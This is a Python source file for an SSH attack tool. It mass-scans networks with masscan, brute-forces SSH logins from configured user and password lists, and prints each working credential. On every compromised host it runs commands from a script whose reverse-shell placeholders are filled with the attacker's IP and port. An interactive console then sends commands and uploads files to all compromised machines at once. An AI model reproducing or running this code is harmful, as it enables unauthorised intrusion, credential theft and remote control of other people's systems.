from termcolor import colored
from pprint import pprint
import multiprocessing
import threading
import ipaddress
import itertools
import paramiko
import argparse
import logging
import masscan
import socket
import random
import queue
import time
import json
import sys
import os
import re

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
 
# make paramiko actually throw errors we can deal with.
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("masscan").setLevel(logging.CRITICAL)

q = queue.Queue()

retry = False
commands = ()
working = []

sucessfulAttempts = {}

hostsToRunOn = ipaddress.ip_network('0.0.0.0')
commandToExecute = ''
running = True
barrier = threading.Barrier(1)
localPath = ''
remotePath = ''

def executeCommands(attempt):
    ip = ipaddress.ip_address(attempt[0])
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(*attempt)
    except paramiko.ssh_exception.AuthenticationException:
        sys.stderr.write(colored('[!!!]', 'red') + '%s@%s login failed.\n' % (attempt[2], attempt[0]))
        client.close()
        del sucessfulAttempts[attempt]
        return
    while running:
        barrier.wait()
        if ip in hostsToRunOn:
            if commandToExecute is not None:
                try:
                    result = client.exec_command(commandToExecute)
                except:
                    try:
                        client.connect(*attempt)
                    except paramiko.ssh_exception.AuthenticationException:
                        sys.stderr.write(colored('[!!!]','red') + '%s@%s login failed.\n' % (attempt[2], attempt[0]))
                        break
                    try:
                        result = client.exec_command(commandToExecute)
                    except Exception as e:
                        sys.stderr.write(colored('[!!!]','red') + '%s@%s unable to send command. %s\n' % (attempt[2], attempt[0], str(e)))
                        break
                q.put((attempt, result))
            else:
                try:
                    sftp = paramiko.SFTPClient.from_transport(client.get_transport())
                    try:
                        confirm = sftp.put(localPath, remotePath, confirm=True)
                        q.put((attempt, confirm))
                    except IOError as e:
                        sys.stderr.write(colored('[!!!]','red') + '%s@%s unable to write file. %s\n' % (attempt[2], attempt[0], str(e)))
                except paramiko.SSHException as e:
                    sys.stderr.write(colored('[!!!]','red') + '%s@%s unable to establish SFTP. %s\n' % (attempt[2], attempt[0], str(e)))
        barrier.wait()
    client.close()
    del sucessfulAttempts[attempt]

def chunks(l, n):
    for i in range(0, len(l), n):
        # Create an index range for l of n items:
        yield l[i:i+n]

def testCredsMP():
    pass

def testCreds(tid):
    # randomlly offset the start of each thread to prevent overwhelming any single SSH server
    time.sleep(random.random())
    # create client with auto accempt policy.
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # retry while the queue has items in it and there are
    # no threads which are still working.  The mechinism isn't
    # perfict but its good enough for us.
    while q.qsize() > 0 or any(working):
        try:
            attempt = q.get(timeout=5)
            working[tid] = True
            client.connect(*attempt, look_for_keys=False)
            print(colored('[###]', 'green'), 'ssh %s@%s -p %d password: %s' % (attempt[2],attempt[0],attempt[1], attempt[3]))
            sucessfulAttempts[attempt] = attempt

            for command in commands:
                client.exec_command(command)
            if retry:
                q.put(attempt)
            working[tid] = False
        except queue.Empty:
            working[tid] = False
        except paramiko.AuthenticationException:
            pass
        except paramiko.ssh_exception.NoValidConnectionsError:
            pass
        except Exception as e:
            sys.stderr.write(colored('[!!!]', 'red') + ' %s retrying\n' % str(e))
            q.put(attempt)
        finally:
            client.close()

def main():
    global commandToExecute
    global hostsToRunOn
    global remotePath
    global localPath
    global commands
    global running
    global barrier
    global retry

    retry = args.retry
    threads = []
    
    with open(args.config) as fp:
        config = json.load(fp)
    
    with open(args.commandsToRun) as fp:
        commands = fp.read()
    commands = commands.replace('$FUN_IP', args.reverseIP, commands.count('$FUN_IP'))
    commands = commands.replace('$FUN_PORT', args.reversePort, commands.count('$FUN_PORT'))
    commands = tuple(commands.split('\n'))

    if args.noScan:
        hosts = []
        for host in config['netcfg']['hosts']:
            try:
                hosts.extend(map(str, ipaddress.ip_network(host)))
            except (ipaddress.AddressValueError, ipaddress.NetmaskValueError) as e:
                sys.stderr.write(colored('[!!!]', 'red') + " Invalid IP Address %s: %s" % (host, str(e)))
                exit(1)
    else:
        scaner = masscan.PortScanner()
        if args.xml is not None:
            try:
                with open(args.xml) as fp:
                    masscanXML = fp.read()
            except IOError as e:
                sys.stderr.write(colored('[!!!]', 'red') + " Error opening XML file: %s" % str(e))
                exit(1)
            try:
                scanWithMetadata = scaner.analyse_masscan_xml_scan(masscanXML)
            except masscan.PortScannerError as e:
                sys.stderr.write(colored('[!!!]', 'red') + " Error parsing XML: %s\n" % str(e))
                exit(1)
        else:
            hostsToScan = ' '.join(config['netcfg']['hosts'])
            portsToScan = ','.join(config['netcfg']['ports'])
            try:
                scanWithMetadata = scaner.scan(hostsToScan, portsToScan, arguments='--wait %d --rate 20000' % (args.wait))
            except (masscan.PortScannerError, masscan.NetworkConnectionError) as e:
                sys.stderr.write(colored('[!!!]', 'red') + "Error running scan: %s\n" % str(e))
                exit(1)
        scan = scanWithMetadata['scan']
        pprint(scan)
        hosts = scan.keys()
    
    # build up attempt queue
    attemptArgs = list(itertools.product(hosts, map(int, config['netcfg']['ports']), config['users'], config['passwords']))
    random.shuffle(attemptArgs) # ensure we aren't slamming the same host/user all the time
    for attempt in attemptArgs:
        q.put_nowait(attempt)
    # setup our total to count toards
    initalQSize = q.qsize()
    # create threads
    for tid in range(args.numThreads):
        t = threading.Thread(target=testCreds, args=(tid,))
        working.append(False)
        t.start() 
        threads.append(t)
    try:
        while not q.empty():
            sys.stdout.write(colored('[%d/%d]\r' % (initalQSize - q.qsize(), initalQSize), 'green'))
        sys.stdout.write((' '*20) + '\r')
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        retry = False
        print('\rSent kill signal, please wait for all threads to finish with current job.')
        while not q.empty():
            q.get()
        for t in threads:
            t.join()
    barrier = threading.Barrier(len(sucessfulAttempts)+1)
    running = True
    threads = []

    for attempt in sucessfulAttempts:
        t = threading.Thread(target=executeCommands, args=(attempt,))
        t.start()
        threads.append(t)
    try:
        while True:
            try:
                option = input('>>> ').strip()
            except EOFError:
                break
            if option in 'hosts':
                while True:
                    try:
                        hostsToRunOn = ipaddress.ip_network(input("Hosts to command: ").strip())
                        break
                    except (ipaddress.AddressValueError, ValueError):
                        sys.stdout.write("\r%s Invalid IP address. " % colored('[!!!]', 'red'))
                    except EOFError:
                        break
            elif option in 'command':
                while True:
                    try:
                        commandToExecute = input("$ ").strip()
                    except EOFError:
                        break
                    if commandToExecute == 'exit':
                        break
                    # unlock barrier for threads
                    barrier.wait()
                    # wait for threads to finish
                    barrier.wait()
                    while not q.empty():
                        attempt, result = q.get_nowait()
                        stdout = result[1].read()
                        stderr = result[2].read()
                        print("%s %s@%s output:\n%s" % (colored("[###]",'green'), attempt[2], attempt[0], stdout.decode('ascii')))
                        if stderr:
                            print("%s %s" % (colored('[!!!]', 'red'), stderr))
            elif option in 'upload':
                while True:
                    try:
                        while True:
                            localPath = input("Local Path: ")
                            remotePath = input("Remote Path: ")
                            try:
                                if not os.path.isfile(localPath):
                                    print('Local file does not exist')
                                else:
                                    break
                            except IOError as e:
                                print('Unable to access "%s". %s' % (localPath, str(e)))
                    except EOFError:
                        break
                    commandToExecute = None
                    barrier.wait()
                    barrier.wait()
                    while not q.empty():
                        attempt, result = q.get_nowait()
                        print("%s %s@%s wrote sucessfully\n" % (colored("[###]",'green'), attempt[2], attempt[0]))
            elif option in 'exit':
                break
            elif option in 'list':
                for attempt in sucessfulAttempts:
                    print(colored('[###]', 'green'), 'ssh %s@%s -p %d password: %s' % (attempt[2],attempt[0],attempt[1], attempt[3]))
    except KeyboardInterrupt:
        print(colored('\n[###]', 'blue'), 'Finishing final operation.')
    running = False
    # ensure no commands will be executed.
    hostsToRunOn = ()
    try:
        barrier.wait()
        barrier.wait()
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(colored('[!!!]', 'red'), 'Forcibly stopping.')
        exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--config", type=str, default="./config.json", help='Path to the configuration json file.  Default "./config.json"')
    parser.add_argument("--noScan", action="store_true", default=False, help='Do not scan any hosts, just assume all hosts are up and have SSH running on that port.')
    parser.add_argument('-x', '--xml', type=str, default=None, help='Use an existing scan xml.')
    parser.add_argument('--retry', action="store_true", default=False)
    parser.add_argument('-c', '--commandsToRun', type=str, default='fun.sh')
    parser.add_argument('-t','--numThreads', type=int, default=5)
    parser.add_argument('-w', '--wait', type=int, default=1)
    parser.add_argument('--reverseIP', type=str, default=get_ip())
    parser.add_argument('--reversePort', type=str, default='5967')
    args = parser.parse_args()
    main()